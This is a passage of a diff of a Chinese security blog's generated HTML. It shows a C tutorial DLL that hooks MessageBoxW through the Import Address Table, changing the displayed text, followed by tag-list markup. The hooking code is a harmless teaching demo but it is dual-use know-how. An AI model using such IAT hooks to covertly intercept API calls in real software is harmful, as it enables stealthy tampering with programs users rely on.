(WINAPI*FP_MSG)(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType);</span><br><span class="line"></span><br><span class="line">FP_MSG g_MyMsg;</span><br><span class="line">DWORD g_IAT_Addr;</span><br><span class="line">DWORD g_Addr;</span><br><span class="line">int</span><br><span class="line">WINAPI</span><br><span class="line">MyMessageBoxW(</span><br><span class="line">_In_opt_ HWND hWnd,</span><br><span class="line">_In_opt_ LPCWSTR lpText,</span><br><span class="line">_In_opt_ LPCWSTR lpCaption,</span><br><span class="line">_In_ UINT uType)</span><br><span class="line">&#123;</span><br><span class="line">	lpText = L&quot;你被HOOK了&quot;;</span><br><span class="line">	lpCaption = L&quot;HOOK&quot;;</span><br><span class="line"></span><br><span class="line">	return g_MyMsg(hWnd, lpText, lpCaption, uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void UnHook()</span><br><span class="line">&#123;</span><br><span class="line">	DWORD dwOld;</span><br><span class="line">	VirtualProtect((LPVOID)g_IAT_Addr, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line"></span><br><span class="line">	*(DWORD*)g_IAT_Addr = (DWORD)g_MyMsg;</span><br><span class="line"></span><br><span class="line">	VirtualProtect((LPVOID)g_IAT_Addr, 4, dwOld, &amp;dwOld);</span><br><span class="line">&#125;</span><br><span class="line">/*</span><br><span class="line">   INT中函数名的下标与IAT中函数地址是一一对应的</span><br><span class="line">*/</span><br><span class="line">void IAT_hook(char* pFunName,char* pDllName)</span><br><span class="line">&#123;</span><br><span class="line">	//获取加载基址</span><br><span class="line">	HMODULE hMod = GetModuleHandle(NULL);</span><br><span class="line">	DWORD dwImageBase = (DWORD)hMod;</span><br><span class="line"></span><br><span class="line">	PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;</span><br><span class="line">	PIMAGE_NT_HEADERS pNt = </span><br><span class="line">		(PIMAGE_NT_HEADERS)(pDos-&gt;e_lfanew + dwImageBase);</span><br><span class="line"></span><br><span class="line">	PIMAGE_DATA_DIRECTORY pImportDir = </span><br><span class="line">		(PIMAGE_DATA_DIRECTORY)</span><br><span class="line">		&amp;pNt-&gt;OptionalHeader.DataDirectory[1];</span><br><span class="line">	//获取导入表地址</span><br><span class="line">	PIMAGE_IMPORT_DESCRIPTOR pImport = </span><br><span class="line">		(PIMAGE_IMPORT_DESCRIPTOR)</span><br><span class="line">		(pImportDir-&gt;VirtualAddress + dwImageBase);</span><br><span class="line">	</span><br><span class="line">	//遍历导入表，查找函数地址的位置</span><br><span class="line">	while (pImport-&gt;Name)</span><br><span class="line">	&#123;</span><br><span class="line">		char* pDll = (char*)(pImport-&gt;Name + dwImageBase);</span><br><span class="line">		//比对模块名（_stricmp比对时不区分大小写）</span><br><span class="line">		if (!_stricmp(pDll, pDllName))</span><br><span class="line">		&#123;</span><br><span class="line">			//IAT找到了</span><br><span class="line">			DWORD* pIAT = (DWORD*)(pImport-&gt;FirstThunk + dwImageBase);</span><br><span class="line">			DWORD* pINT = (DWORD*)(pImport-&gt;OriginalFirstThunk + dwImageBase);</span><br><span class="line"></span><br><span class="line">			while (*pINT)</span><br><span class="line">			&#123;</span><br><span class="line">				//最高位为0是名称导入的</span><br><span class="line">				if (!(*pINT &amp; 0x80000000))</span><br><span class="line">				&#123;</span><br><span class="line">					PIMAGE_IMPORT_BY_NAME pName =</span><br><span class="line">						(PIMAGE_IMPORT_BY_NAME)</span><br><span class="line">						(*pINT + dwImageBase);</span><br><span class="line">					//比对函数名称</span><br><span class="line">					if (!_stricmp(pName-&gt;Name,pFunName))</span><br><span class="line">					&#123;</span><br><span class="line">						//进来说明找到了</span><br><span class="line">						//保存原来的地址用于恢复</span><br><span class="line">						g_IAT_Addr = (DWORD)pIAT;</span><br><span class="line">						//将MessageBoxW地址赋值给函数指针</span><br><span class="line">						g_MyMsg = (FP_MSG)*pIAT;</span><br><span class="line">					    //IAT表的内存属性是只读</span><br><span class="line">						//需要修改内存属性为可写才能修改</span><br><span class="line">						DWORD dwOld;</span><br><span class="line">						VirtualProtect(pIAT, 4, PAGE_READWRITE, &amp;dwOld);</span><br><span class="line">						//修改为自己的函数地址</span><br><span class="line">						*pIAT = (DWORD)MyMessageBoxW;</span><br><span class="line">						//恢复原来的属性</span><br><span class="line">						VirtualProtect(pIAT, 4, dwOld, &amp;dwOld);</span><br><span class="line">						return;</span><br><span class="line">						</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				//下一个</span><br><span class="line">				pINT++;</span><br><span class="line">				pIAT++;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		//下一个某块</span><br><span class="line">		pImport++;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain( HMODULE hModule,</span><br><span class="line">                       DWORD  ul_reason_for_call,</span><br><span class="line">                       LPVOID lpReserved</span><br><span class="line">					 )</span><br><span class="line">&#123;</span><br><span class="line">	switch (ul_reason_for_call)</span><br><span class="line">	&#123;</span><br><span class="line">	case DLL_PROCESS_ATTACH:		</span><br><span class="line">		IAT_hook(&quot;MessageBoxW&quot;,&quot;user32.dll&quot;);</span><br><span class="line">		break;</span><br><span class="line">	//case DLL_THREAD_ATTACH:</span><br><span class="line">	//case DLL_THREAD_DETACH:</span><br><span class="line">	case DLL_PROCESS_DETACH:</span><br><span class="line">		UnHook();</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">Window编程原理</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2018/08/20/Hook原理/">展开全文 >></a>
         </p>
       
 
@@ -1185,10 +1190,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">linux</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">汇编</a>
               </li>
              
@@ -1205,6 +1206,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">linux</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color1">Window编程原理</a>
               </li>
              
@@ -1217,6 +1222,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">思考</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">Windbg</a>
               </li>
              
@@ -1225,11 +1234,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">思考</a>
+                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1238,14 +1251,6 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">kail</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">hexo</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -1261,19 +1266,19 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">加壳</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">Window内核编程</a>
+                <a href="javascript:void(0)" class="js-tag color1">web安全</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">漏洞分析</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color1">Window内核编程</a>
               </li>
              
               <li class="article-tag-list-item">
